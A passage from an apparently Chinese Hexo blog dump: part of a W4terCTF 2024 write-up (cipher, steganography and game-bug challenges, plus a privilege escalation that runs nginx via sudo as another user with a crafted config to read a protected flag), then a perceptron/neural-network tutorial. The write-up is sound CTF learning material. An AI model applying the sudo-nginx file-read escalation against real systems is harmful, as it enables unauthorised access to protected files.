&#x27;G4wivEMZ&#123;MYDQaZX_ZnM_TK5d_rzUtN3Q3_GOloOL5_jCoZ_aVvr_lCRCsMRfq&#125;&#x27;plaintext = decrypt_vigenere_variant(ciphertext, key)print(f&#x27;The plaintext is: &#123;plaintext&#125;&#x27;)#W4terCTF&#123;BENEaTH_ThE_MA5k_vlGeN3R3_STrlKE5_bAcK_wIth_vENGeANce&#125; Spam 2024垃圾邮件套娃 这题有四五关左右，也不知我的解法如何，但很有趣。首先，与去年一样去spammimic去解第一层垃圾邮件 然后进行解十六进制，得出的字符串阅读性很差，观察得出是emoji的unnicode，使用html将unnicode直接转义得出emoji。 然后将emoji进行aes解码key为🔑 得到这个东西，很显然是base64+异或用Cyberchef求解 看到了这个一看就很想flag的东东剩的这一步很有趣，我是自己看出来奇数位都是对的偶数位不是ACSII码值加4就是减4，然后后面根据“词频分析”进行手解的以下是手解的图： GZ GPT观察输出，因为不是语言模型，所以输出的语句只是看起来也点区别，并不算完全随机 将gztime的话复制到txt文本之中 发现txt阅读器实际上读到的字符数比我们看到的要多 得出零宽字符隐写的结论 每一位的加密方式也有细微区别，但是除了正确解密基本上都是乱码 干扰较小 Sign In找到W4terDr0p战队即可 Priv Escape文件位置12345# 系统配置文件/etc/nginx/nginx.conf# 个人配置文件/home/W4terCTFPlayer/nginx.conf 写入个人文件内容12345678910111213141516171819202122232425echo &#x27;user r00t;worker_processes auto;pid /home/W4terCTFPlayer/nginx.pid;events &#123; worker_connections 768;&#125;http &#123; sendfile on; autoindex on; tcp_nopush on; tcp_nodelay on; gzip on; server &#123; listen 80; # 指定网站的根目录 root /home/r00t/; autoindex on; location / &#123; autoindex on; try_files $uri $uri/ =404; &#125; &#125;&#125;&#x27; &gt;&gt; nginx.conf 123sudo -u r00t /usr/sbin/nginx -c /home/W4terCTFPlayer/nginx.confcurl http://localhost/tmp/flag 命令1234567891011nginx -g &#x27;nginx.conf /home/W4terCTFPlayer/nginx.conf;&#x27;/usr/sbin/nginx -t -c /home/W4terCTFPlayer/nginx.conf# nginx: [alert] could not open error log file: open() &quot;/var/log/nginx/error.log&quot; failed (13: Permission denied)2024/04/27 02:13:59 [warn] 69#69: the &quot;user&quot; directive makes sense only if the master process runs with super-user privileges, ignored in /home/W4terCTFPlayer/nginx.conf:12024/04/27 02:13:59 [warn] 69#69: the &quot;user&quot; directive makes sense only if the master process runs with super-user privileges, ignored in /home/W4terCTFPlayer/nginx.conf:12024/04/27 02:13:59 [emerg] 69#69: &quot;worker_processes&quot; directive is duplicate in /home/W4terCTFPlayer/nginx.conf:4sudo nginx -g &#x27;nginx.conf /home/W4terCTFPlayer/etc/nginx/new_error.log;&#x27;sudo /usr/sbin/nginx -t -c /home/W4terCTFPlayer/nginx.conf# 会弹出[sudo] password for W4terCTFPlayer: 问题123456789101112131415161718192021222324252627282930313233-- 已解决 --# 1. 用户身份# 根据sudo -l (r00t)NOPASSWD: /usr/sbin/nginx 以及hint 不用提权到root但是以root身份执行命令sudo -u r00t 启动 nginx# 2. r00t无法访问/home/W4terCTFPlayer/nginx.confchmod 给文件夹和文件 777权限 (已经无所谓了QwQ# 3. user+worker_processes报错重复定义 但是自定义conf里面并没有删除了include /etc/nginx/modules-enabled/*.conf; 解决# 4. sudo -u r00t /usr/sbin/nginx -c /home/W4terCTFPlayer/nginx.confW4terCTFPlayer@priv-escape-70de9e4003bb4a82:~$ sudo -u r00t /usr/sbin/nginx -c /home/W4terCTFPlayer/nginx.confnginx: [warn] the &quot;user&quot; directive makes sense only if the master process runs with super-user privileges, ignored in /home/W4terCTFPlayer/nginx.conf:1// 第一条警告是因为主进程不是r00t而是W4terCTFPlayer// 不过设置user W仍然报错nginx: [emerg] bind() to 0.0.0.0:811 failed (98: Unknown error)nginx: [emerg] bind() to 0.0.0.0:811 failed (98: Unknown error)nginx: [emerg] bind() to 0.0.0.0:811 failed (98: Unknown error)nginx: [emerg] bind() to 0.0.0.0:811 failed (98: Unknown error)nginx: [emerg] bind() to 0.0.0.0:811 failed (98: Unknown error)nginx: [emerg] still could not bind()怀疑是80端口占用了 改成了8080 811 57168 57169这些端口依然failed# sudo -u r00t /usr/sbin/nginx -s stop# ps 发现nginx并没有已经在运行的情况# 换了五六个端口依然是failed端口绑定失败，但是实际已经完成了创建使用curl访问curl http://localhost/home/r00t/tmp/flag broken.mp4根据视频内容我们可以发现刚好是一个修复视频的软件操作，直接找到并下载一把梭 Pwn（3题）Python Wants Flags玩多亿次就会发现这个有bug，好在我才用录频来玩才能抓住漏洞的产生：实际上就是当蛇吃到食物的时候尾巴会身长两格，然后就会覆盖掉储存的数组，这个是吃墙壁吃出来的，同理door也储存在同一个地方可以覆盖。然后撞墙的时候我发现我一次会被吃掉两格那么我们可以利用这个漏洞来打开墙壁。手操的过程极为痛苦，我后面直接暂停计算位置才艰难拿到flag 2048! 0x800 Edition!一开始尝试了全是1输了很多，但是没啥效果，但我想想唯一有机会攻击的就是username那里，于是尝试了一下移动键输入，就碰对了。 Remember It 0问就是一个一个截屏截出来的","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://d3v3nlxk.github.io/tags/writeup/"}]},{"title":"第一章 感知机与神经网络","slug":"第一章 感知机","date":"2024-04-10T16:00:00.000Z","updated":"2024-05-08T08:48:27.873Z","comments":true,"path":"2024/04/11/第一章 感知机/","permalink":"https://d3v3nlxk.github.io/2024/04/11/%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E6%84%9F%E7%9F%A5%E6%9C%BA/","excerpt":"","text":"感知机一个感知机相当于数字电路里面的一个门电路，多层感知机实现完整电路，以下是与门、与非门和或门的基础实现代码以及原理。如果使用横坐标为$x_1$，纵坐标为$x_2$的数轴来表示，你会发现实际上是$w_1x_1+w_2x_2+b=0$这条直线直线将两块区域划分开来，一部分为0，另一部分为1。 y=\\begin{cases} 0, &(b+w_1x_1+w_2x_2 \\leq 0)\\\\\\ 1, &(b+w_1x_1+w_2x_2 > 0) \\end{cases}其中$b$称为偏置,$w_1$和$w2$称为权重。 12345678910111213141516171819202122232425262728293031323334353637383940import numpy as npdef AND(x1,x2): #与门的实现 x=np.array([x1,x2]) #输入 w=np.array([0.5,0.5]) #权重 b=-0.7 #偏置 tmp=np.sum(w*x)+b #判断 if tmp &lt;= 0: return 0 else: return 1 def NAND(x1,x2): #与非门的实现 x=np.array([x1,x2]) #输入 w=np.array([0.5,0.5]) #权重 b=0.7 #仅偏置与and不同 tmp=np.sum(w*x)+b #判断 if tmp &lt;= 0: return 0 else: return 1 def OR(x1,x2): #或门的实现 x=np.array([x1,x2]) #输入 w=np.array([0.5,0.5]) #权重 b=-0.2 #仅偏置与and不同 tmp=np.sum(w*x)+b #判断 if tmp &lt;= 0: return 0 else: return 1def XOR(x1,x2): s1=NAND(x1,x2) #通过与非门、或门、与门实现异或 s2=OR(X1,x2) y=AND(s1,s2) return yfor x in range(0,2): for y in range(0,2): print(XOR(x,y)) 神经网络基本概念神经网络构成：最左边输入层，中间所有部分统称为中间层（也称为隐藏层），右侧为输出层。e.g.上面提到的$x_1$和$x_2$为两个输入神经元（第0层），连接着中间的两个NAND和OR神经元（第1层），再连第二个中间层AND神经元（第2层），最后输出（第3层）。 激活函数将输入信号的总和转换为输出信号，类似中间层的处理函数，下面介绍几种常见的激活函数。 激活函数 阶跃函数 y=\\begin{cases} 0, &(x \\leq 0)\\\\\\ 1, &(x > 0) \\end{cases} 代码实现： 123def stepfunction(x): y=x&gt;0 return y.astype(np.int64) Sigmoid函数 h(x)=\\frac{1}{1+e^{-x}} 代码实现： 12def sigmoid(x): return 1/(1+np.exp(-x)) 观察函数图像可以发现，阶跃函数和sigmoid函数分别是曲线与折线，都属于非线性函数，而形如$y=ax$的线性函数，在嵌套当中无法发挥更好的作用（$y=h(h(h(x))$可以写成$y=a^3*x^3$),激活函数都是非线性函数。 ReLU函数 h(x)=\\begin{cases} 0, &(x \\leq 0)\\\\\\ x, &(x > 0) \\end{cases} 代码实现： 12def relu(x): return np.maximum(x,0) 在处理分类问题和回归问题时，可以调整激活函数：回归问题用恒等函数，分类问题用$softmax$函数 Softmax函数 y_k=\\frac{e^{a_k-C}}{\\sum_{i=1}^n{e^{a_i-C}}}这个式子表示假设输出层有有$n$个神经元，求第$k$个神经元的输出。为了防止溢出所以通常在指数位减去一个较大的数C来平衡，一般会使用输入信号中的最大值。由于输出在0到1之间，所以一般该函数都用于表示概率，即分类为某个物体的概率。 代码实现： 123456def softmax(a): c = np.max(a) exp_a = np.exp(a - c) sum_exp_a = np.sum(exp_a) y= exp_a/sum_exp_areturn y 神经网络的实现通过矩阵点乘的方式能够将输入根据权重计算到下一层，实现神经网络的向前推进 123456789101112131415161718192021222324import numpy as npdef init_network(): network=&#123;&#125; #字典变量 network[&#x27;W1&#x27;]=np.array([[0.1,0.3,0.5],[0.2,0.4,0.6]]) #第零层有两个输入，三个输出 network[&#x27;b1&#x27;] = np.array([0.1, 0.2, 0.3]) network[&#x27;W2&#x27;] = np.array([[0.1, 0.4], [0.2, 0.5], [0.3, 0.6]]) #第一层三个输入，两个输出 network[&#x27;b2&#x27;] = np.array([0.1, 0.2]) network[&#x27;W3&#x27;] = np.array([[0.1, 0.3], [0.2, 0.4]]) #第二层两个输入，两个输出 network[&#x27;b3&#x27;] = np.array([0.1, 0.2]) return networkdef forward(network, x): w1, w2, w3=network[&#x27;W1&#x27;],network[&#x27;W2&#x27;],network[&#x27;W3&#x27;] b1, b2, b3=network[&#x27;b1&#x27;],network[&#x27;b2&#x27;],network[&#x27;b3&#x27;] a1=np.dot(x,w1) + b1 z1=sigmoid(a1) #激发函数处理 a2=np.dot(z1,w2) + b2 z2=sigmoid(a2) a3=np.dot(z2,w3) + b3 y = a3 return ynetwork=init_network()x=np.array([1.0,0.5])y=forward(network,x)print(y) #[0.31682708 0.69627909] 总结前面都是一些比较通俗易懂的内容，可以过的比较快，重点还是要掌握如何使用python语言去处理数据，对于模型原理更偏向于数学方面，需要有良好的线性代数以及相关的数理统计知识。","categories":[],"tags":[{"name":"AI","slug":"AI","permalink":"https://d3v3nlxk.github.io/tags/AI/"}]},{"title":"我的第一篇博客文章","slug":"我的第一篇博客文章","date":"2024-03-29T12:06:24.000Z","updated":"2024-04-10T13:05:57.636Z","comments":true,"path":"2024/03/29/我的第一篇博客文章/","permalink":"https://d3v3nlxk.github.io/2024/03/29/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/","excerpt":"","text":"​看到队里面的其他同学都开始使用自己的博客，我想想为了学习深度学习我也得弄个整理知识结构的地方出来，于是今天总算是做出来了","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2024-03-29T12:05:02.572Z","updated":"2024-03-29T12:05:02.572Z","comments":true,"path":"2024/03/29/hello-world/","permalink":"https://d3v3nlxk.github.io/2024/03/29/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://d3v3nlxk.github.io/tags/reverse/"},{"name":"writeup","slug":"writeup","permalink":"https://d3v3nlxk.github.io/tags/writeup/"},{"name":"AI","slug":"AI","permalink":"https://d3v3nlxk.github.io/tags/AI/"}]}